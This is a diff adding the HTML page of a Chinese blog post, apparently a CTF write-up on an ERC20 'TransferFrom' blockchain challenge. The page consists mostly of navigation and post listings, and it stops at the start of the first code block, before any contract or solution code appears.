@@ -1,0 +1,1278 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>区块链学习笔记之RealWorld体验赛——TransferFrom | Van1sh的小屋</title>
+  <meta name="keywords" content=" CTF ">
+  <meta name="description" content="区块链学习笔记之RealWorld体验赛——TransferFrom | Van1sh的小屋">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Van1sh的小屋">
+<meta property="og:url" content="http://jayxv.github.io/categories/index.html">
+<meta property="og:site_name" content="Van1sh的小屋">
+<meta property="og:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2019-07-14T08:00:42.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Van1sh的小屋">
+<meta name="twitter:description" content="It is not ignorance and weakness but arrogance that destroys mankind">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/sublime.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>Van1sh</span>
+</div>
+
+<div class="icon">
+    
+        
+    
+        
+        <a title="github" href="https://github.com/JayxV" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+        <a title="email" href="mailto:643713081@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=643713081&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+    
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(42)</small></div></li>
+    
+        
+            
+            <li><div data-rel="比赛小屋">比赛小屋<small>(14)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="工具小屋">工具小屋<small>(5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="合约小屋"><i class="fold iconfont icon-right"></i>合约小屋<small>(2)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="contract">contract<small>(2)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="密码小屋"><i class="fold iconfont icon-right"></i>密码小屋<small>(16)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="ECC">ECC<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Paillier">Paillier<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Lattice">Lattice<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Stream">Stream<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Knapsack">Knapsack<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Rsa">Rsa<small>(3)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Block">Block<small>(3)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="Basic">Basic<small>(2)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="CTF">CTF<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="RSA">RSA<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="Web小屋"><i class="fold iconfont icon-right"></i>Web小屋<small>(3)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="Files related">Files related<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="SQL">SQL<small>(1)</small></div>
+                            
+                        </li>
+                            
+                        <li><div data-rel="XSS">XSS<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="逆向小屋"><i class="fold iconfont icon-right"></i>逆向小屋<small>(1)</small></div>
+                
+                    <ul class="sub hide">
+                        
+                        <li><div data-rel="patch">patch<small>(1)</small></div>
+                            
+                        </li>
+                            
+                    </ul>
+                
+            </li>
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+        
+    
+        
+            
+            <li><div data-rel="小书屋">小书屋<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/about">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="42">
+<input type="hidden" id="yelog_site_word_count" value="177.8k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://www.fzwjscj.xyz/">fzwjscj</a></li>
+            
+            <li><a target="_blank" href="http://dldxz.cn/">DLDXZ</a></li>
+            
+            <li><a target="_blank" href="http://fanda.cloud/">fanda</a></li>
+            
+            <li><a target="_blank" href="http://passingfoam.com/">PassingFoam&#39;s blog</a></li>
+            
+            <li><a target="_blank" href="https://eqqie.cn/">赤道企鹅</a></li>
+            
+            <li><a target="_blank" href="http://blog.ragdoll.work/">咲夜南梦</a></li>
+            
+            <li><a target="_blank" href="https://www.zhaoj.in/">glzjin</a></li>
+            
+            <li><a target="_blank" href="https://coinc1dens.github.io/">Coinc1dens</a></li>
+            
+            <li><a target="_blank" href="http://blog.soreatu.com/">soreatu</a></li>
+            
+            <li><a target="_blank" href="http://www.ga1axy.top/">盖乐希</a></li>
+            
+            <li><a target="_blank" href="https://shawroot.cc/">Root.</a></li>
+            
+            <li><a target="_blank" href="https://l1near.top/">l1near</a></li>
+            
+            <li><a target="_blank" href="https://0xdktb.top/">0xDktb</a></li>
+            
+            <li><a target="_blank" href="https://www.wootec.top/">Reverier</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="以 in: 开头进行全文搜索" />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Write Up</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">docker</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Sage</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ECC</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Paillier</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Crypto</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Web</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Files</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Serialization</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">Lattice</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Dsa</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">LCG</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Rc4</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SM4</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Knapsack</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Rsa</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">DES</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">差分密码分析</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">RE</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SQL</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">python</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">操作模式</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">number theory</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Abstract algebra</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">SPN</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">线性密码分析</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Book</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">Nmap</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Coppersmith’s Method</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">XSS</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">Linux</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">book</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a id="top" class="密码小屋 Basic "
+           href="/2020/05/27/密码学学习笔记之introduction to mathematical cryptography/"
+           data-tag="Book"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 introduction to mathematical cryptography">密码学学习笔记 之 introduction to mathematical cryptography</span>
+            <span class="post-date" title="2020-05-27 21:05:00">2020/05/27</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/02/11/区块链学习笔记之paradigm-CTF babysandbox/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之paradigm-CTF babysandbox">区块链学习笔记之paradigm-CTF babysandbox</span>
+            <span class="post-date" title="2022-02-11 16:22:00">2022/02/11</span>
+        </a>
+        
+        <a  class="合约小屋 contract "
+           href="/2022/01/23/区块链学习笔记之RealWorld体验赛/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="区块链学习笔记之RealWorld体验赛——TransferFrom">区块链学习笔记之RealWorld体验赛——TransferFrom</span>
+            <span class="post-date" title="2022-01-23 00:11:00">2022/01/23</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2021/08/23/2021 祥云杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2021 祥云杯">2021 祥云杯</span>
+            <span class="post-date" title="2021-08-23 14:07:00">2021/08/23</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2021/08/06/密码学学习笔记之线性分析入门篇——EzSPN/"
+           data-tag="SPN,线性密码分析"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 线性分析入门篇——EzSPN">密码学学习笔记 之 线性分析入门篇——EzSPN</span>
+            <span class="post-date" title="2021-08-06 09:24:25">2021/08/06</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2021/07/16/密码学学习笔记之差分分析入门篇——四轮DES/"
+           data-tag="DES,差分密码分析"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 差分分析入门篇——四轮DES">密码学学习笔记 之 差分分析入门篇——四轮DES</span>
+            <span class="post-date" title="2021-07-16 09:24:25">2021/07/16</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2021/04/04/2021HFCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2021 HFCTF">2021 HFCTF</span>
+            <span class="post-date" title="2021-04-04 11:02:47">2021/04/04</span>
+        </a>
+        
+        <a  class="逆向小屋 patch "
+           href="/2021/03/27/逆向学习笔记之drinkSomeTea/"
+           data-tag="RE"
+           data-author="Van1sh" >
+            <span class="post-title" title="逆向学习笔记 之 drinkSomeTea">逆向学习笔记 之 drinkSomeTea</span>
+            <span class="post-date" title="2021-03-27 19:22:00">2021/03/27</span>
+        </a>
+        
+        <a  class="密码小屋 "
+           href="/2021/01/01/密码学学习笔记之密码学随笔/"
+           data-tag="Crypto"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 密码学随笔">密码学学习笔记 之 密码学随笔</span>
+            <span class="post-date" title="2021-01-01 00:00:00">2021/01/01</span>
+        </a>
+        
+        <a  class="密码小屋 RSA "
+           href="/2020/12/18/密码学学习笔记之RSA的一些套路/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 RSA的一些套路">密码学学习笔记 之 RSA的一些套路</span>
+            <span class="post-date" title="2020-12-18 14:32:00">2020/12/18</span>
+        </a>
+        
+        <a  class="密码小屋 CTF "
+           href="/2020/12/18/密码学学习笔记之CTF/"
+           data-tag="CTF"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 CTF">密码学学习笔记 之 CTF</span>
+            <span class="post-date" title="2020-12-18 00:00:00">2020/12/18</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/12/10/2020RoarCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 RoarCTF">2020 RoarCTF</span>
+            <span class="post-date" title="2020-12-10 10:00:00">2020/12/10</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/11/04/2020ByteCTF&X-NUCA部分密码学题解/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 ByteCTF&amp;X-NUCA">2020 ByteCTF&amp;X-NUCA</span>
+            <span class="post-date" title="2020-11-04 10:00:00">2020/11/04</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2020/08/13/密码学学习笔记之coppersmith/"
+           data-tag="Coppersmith’s Method"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 Coppersmith’s Method">密码学学习笔记 之 Coppersmith’s Method</span>
+            <span class="post-date" title="2020-08-13 10:00:00">2020/08/13</span>
+        </a>
+        
+        <a  class="Web小屋 Files related "
+           href="/2020/08/09/Web学习笔记之文件与序列化/"
+           data-tag="Web,Files,Serialization"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 文件与序列化">Web学习笔记 之 文件与序列化</span>
+            <span class="post-date" title="2020-08-09 14:16:00">2020/08/09</span>
+        </a>
+        
+        <a  class="Web小屋 SQL "
+           href="/2020/08/07/Web学习笔记之SQL注入/"
+           data-tag="Web,SQL"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 SQL注入">Web学习笔记 之 SQL注入</span>
+            <span class="post-date" title="2020-08-07 13:18:00">2020/08/07</span>
+        </a>
+        
+        <a  class="Web小屋 XSS "
+           href="/2020/07/26/Web学习笔记之XSS/"
+           data-tag="Web,XSS"
+           data-author="Van1sh" >
+            <span class="post-title" title="Web学习笔记 之 XSS">Web学习笔记 之 XSS</span>
+            <span class="post-date" title="2020-07-26 10:44:00">2020/07/26</span>
+        </a>
+        
+        <a  class="密码小屋 Knapsack "
+           href="/2020/06/08/密码学学习笔记之knapsack/"
+           data-tag="Knapsack"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 knapsack">密码学学习笔记 之 knapsack</span>
+            <span class="post-date" title="2020-06-08 10:30:43">2020/06/08</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/26/2020BJD3rd/"
+           data-tag="Write Up"
+           data-author="Van1sh &amp; FzWjScJ" >
+            <span class="post-title" title="2020 BJD3rd">2020 BJD3rd</span>
+            <span class="post-date" title="2020-05-26 16:00:47">2020/05/26</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/24/2020GKCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 GKCTF">2020 GKCTF</span>
+            <span class="post-date" title="2020-05-24 17:05:00">2020/05/24</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2020/05/20/sage常用命令/"
+           data-tag="Sage"
+           data-author="Van1sh" >
+            <span class="post-title" title="sage常用命令">sage常用命令</span>
+            <span class="post-date" title="2020-05-20 11:22:00">2020/05/20</span>
+        </a>
+        
+        <a  class="密码小屋 Paillier "
+           href="/2020/05/14/密码学学习笔记之paillier cryptosystem/"
+           data-tag="Paillier"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 paillier cryptosystem">密码学学习笔记 之 paillier cryptosystem</span>
+            <span class="post-date" title="2020-05-14 11:00:19">2020/05/14</span>
+        </a>
+        
+        <a  class="密码小屋 Lattice "
+           href="/2020/05/12/密码学学习笔记之HNP/"
+           data-tag="Lattice,Dsa,LCG"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 HNP">密码学学习笔记 之 HNP</span>
+            <span class="post-date" title="2020-05-12 10:00:57">2020/05/12</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/10/2020网鼎杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 网鼎杯">2020 网鼎杯</span>
+            <span class="post-date" title="2020-05-10 21:15:00">2020/05/10</span>
+        </a>
+        
+        <a  class="密码小屋 ECC "
+           href="/2020/05/07/密码学学习笔记之NCCIP/"
+           data-tag="ECC"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 NCCIP">密码学学习笔记 之 NCCIP</span>
+            <span class="post-date" title="2020-05-07 10:30:43">2020/05/07</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/05/05/2020De1CTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 De1CTF">2020 De1CTF</span>
+            <span class="post-date" title="2020-05-05 15:57:00">2020/05/05</span>
+        </a>
+        
+        <a  class="密码小屋 Block "
+           href="/2020/03/03/密码学学习笔记之分组密码操作模式/"
+           data-tag="操作模式"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 分组密码操作模式">密码学学习笔记 之 分组密码操作模式</span>
+            <span class="post-date" title="2020-03-03 15:15:00">2020/03/03</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2020/02/18/2020hgame_week1/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2020 hgame week1">2020 hgame week1</span>
+            <span class="post-date" title="2020-02-18 16:22:35">2020/02/18</span>
+        </a>
+        
+        <a  class="密码小屋 Stream "
+           href="/2020/01/30/密码学学习笔记之RC4与SM4/"
+           data-tag="Rc4,SM4"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 RC4与SM4">密码学学习笔记 之 RC4与SM4</span>
+            <span class="post-date" title="2020-01-30 00:05:00">2020/01/30</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2019/12/04/密码学学习笔记之浅析On r-th Root Extraction Algorithm in Fq/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq">密码学学习笔记 之 浅析On r-th Root Extraction Algorithm in Fq</span>
+            <span class="post-date" title="2019-12-04 14:30:46">2019/12/04</span>
+        </a>
+        
+        <a  class="密码小屋 Basic "
+           href="/2019/12/03/密码学学习笔记之数论四大定理及应用/"
+           data-tag="number theory,Abstract algebra"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 数论四大定理及应用">密码学学习笔记 之 数论四大定理及应用</span>
+            <span class="post-date" title="2019-12-03 15:30:25">2019/12/03</span>
+        </a>
+        
+        <a  class="密码小屋 Rsa "
+           href="/2019/11/11/密码学学习笔记之浅析Pollard's rho algorithm及其应用/"
+           data-tag="Rsa"
+           data-author="Van1sh" >
+            <span class="post-title" title="密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用">密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</span>
+            <span class="post-date" title="2019-11-11 15:32:00">2019/11/11</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/11/08/2019UNCTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 UNCTF">2019 UNCTF</span>
+            <span class="post-date" title="2019-11-08 11:30:30">2019/11/08</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/11/01/docker和docker-compose的安装/"
+           data-tag="docker"
+           data-author="Van1sh" >
+            <span class="post-title" title="安装Docker 和 Docker-Compose以及docker images的制作及上传">安装Docker 和 Docker-Compose以及docker images的制作及上传</span>
+            <span class="post-date" title="2019-11-01 21:00:00">2019/11/01</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/09/12/Linux 基础/"
+           data-tag="Linux"
+           data-author="Vanish" >
+            <span class="post-title" title="Linux 基础">Linux 基础</span>
+            <span class="post-date" title="2019-09-12 00:17:00">2019/09/12</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/29/2019第五空间/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 第五空间">2019 第五空间</span>
+            <span class="post-date" title="2019-08-29 12:18:35">2019/08/29</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/27/2019OGeek/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 OGeek">2019 OGeek</span>
+            <span class="post-date" title="2019-08-27 11:02:35">2019/08/27</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/08/03/2019De1CTF/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 De1CTF">2019 De1CTF</span>
+            <span class="post-date" title="2019-08-03 22:14:55">2019/08/03</span>
+        </a>
+        
+        <a  class="小书屋 "
+           href="/2019/08/02/三体/"
+           data-tag="book"
+           data-author="Van1sh" >
+            <span class="post-title" title="三体">三体</span>
+            <span class="post-date" title="2019-08-02 12:56:00">2019/08/02</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/07/22/nmap/"
+           data-tag="Nmap"
+           data-author="Van1sh" >
+            <span class="post-title" title="初遇Nmap">初遇Nmap</span>
+            <span class="post-date" title="2019-07-22 16:07:55">2019/07/22</span>
+        </a>
+        
+        <a  class="工具小屋 "
+           href="/2019/07/21/python 正则/"
+           data-tag="python"
+           data-author="Van1sh" >
+            <span class="post-title" title="python 之 正则">python 之 正则</span>
+            <span class="post-date" title="2019-07-21 22:30:35">2019/07/21</span>
+        </a>
+        
+        <a  class="比赛小屋 "
+           href="/2019/07/15/2019赛博杯/"
+           data-tag="Write Up"
+           data-author="Van1sh" >
+            <span class="post-title" title="2019 赛博杯">2019 赛博杯</span>
+            <span class="post-date" title="2019-07-15 16:22:35">2019/07/15</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-区块链学习笔记之RealWorld体验赛" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">区块链学习笔记之RealWorld体验赛——TransferFrom</h1>
+    
+    <div class="article-meta">
+        
+        
+        <span class="author"><a>Van1sh</a></span>
+        
+        
+        <span class="book">
+            
+                <a  data-rel="合约小屋">合约小屋</a>/
+            
+                <a  data-rel="contract">contract</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color4">CTF</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2022-02-11 16:23:20'>2022-01-23 00:11</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>字数:1.7k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#erc20-fake-sol"><span class="toc-text">erc20_fake.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#deployer-sol"><span class="toc-text">deployer.sol</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#攻击合约"><span class="toc-text">攻击合约</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题步骤"><span class="toc-text">解题步骤</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="erc20-fake-sol"><a href="#erc20-fake-sol" class="headerlink" title="erc20_fake.sol"></a>erc20_fake.sol</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span 